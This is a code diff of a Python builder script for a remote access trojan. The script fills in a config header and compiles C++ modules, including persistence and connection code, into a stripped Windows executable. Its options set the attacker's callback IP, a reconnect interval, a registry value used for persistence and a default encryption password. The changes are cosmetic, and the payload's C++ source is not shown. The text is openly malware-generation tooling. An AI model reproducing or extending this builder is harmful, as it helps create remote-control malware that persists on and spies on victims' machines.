@@ -50,6 +50,7 @@ class GeneratePayload:
         else:
             self.main()
     
+
     def writeFile(self, data):
         try:
            
@@ -66,6 +67,7 @@ class GeneratePayload:
         else:
             other.printColor("successfully", "[+] writing in common.h is done successfully. ")
 
+
     def compilate(self):
 
         current_path = os.getcwd()
@@ -73,6 +75,7 @@ class GeneratePayload:
         if(self.os == "Linux"):
             #if os is linux <3
             cmd = "i686-w64-mingw32-g++ main.cpp Exec.cpp other.cpp   HandShake.cpp  Connexion.cpp  Persistence.cpp  -o {}  -lws2_32 -static-libgcc -static-libstdc++ -Os -s".format(current_path+"/payload/"+self.name)
+            print(cmd)
         elif(self.os == "Windows"):
             cmd = "g++ main.cpp Exec.cpp HandShake.cpp  Persistence.cpp Connexion.cpp other.cpp -o {} -lws2_32 -Os -s".format(current_path+"/payload/"+self.name)
         else:
@@ -99,6 +102,7 @@ class GeneratePayload:
         other.printColor("successfully","[+] the RAT was successfully compiled.") 
         other.printColor("information", "[?] the location of the RAT: {}\n".format(current_path+"/payload/"+self.name))   
         
+
     def main(self):
         #Choice default.
         #If the user does not add any argument in the command line.
@@ -121,7 +125,7 @@ parser.add_argument("-i","--ip", dest="IP", required=True, help="IP address of t
 parser.add_argument("-r","--reconnect", dest="RECONNECT",default=20,  help="the time between each reconnection attempt if the server is offline (in seconds).")
 parser.add_argument("-n","--name", dest="NAME", default="payload.exe", help="the name of the executable (of the rat)")
 parser.add_argument("-m","--move", dest="MOVE", default=False, help="Under development...")
-parser.add_argument("-vr","--registry", dest="REGISTRY_VALUE", default="win64", help="the name of the value of the subkey of the windows registry.")
+parser.add_argument("-rs","--registry", dest="REGISTRY_STRING", default="win64", help="the name of the value of the subkey of the windows registry.")
 parser.add_argument("-pa", "--password", dest="PASSWORD", default="CISCOTHEBOSS", help="The password to generate the key to encrypt and decrypt the data. The default password is 'CISCOTHEBOSS'.")
 
 init()
@@ -136,7 +140,7 @@ try:
     IP  = str(argv["IP"])
     RECO = int(argv["RECONNECT"])
     NAME = str(argv["NAME"])
-    REGISTRY = str(argv["REGISTRY_VALUE"])
+    REGISTRY = str(argv["REGISTRY_STRING"])
     PASSWORD = str(argv["PASSWORD"])
     
     if not(argv["MOVE"]):
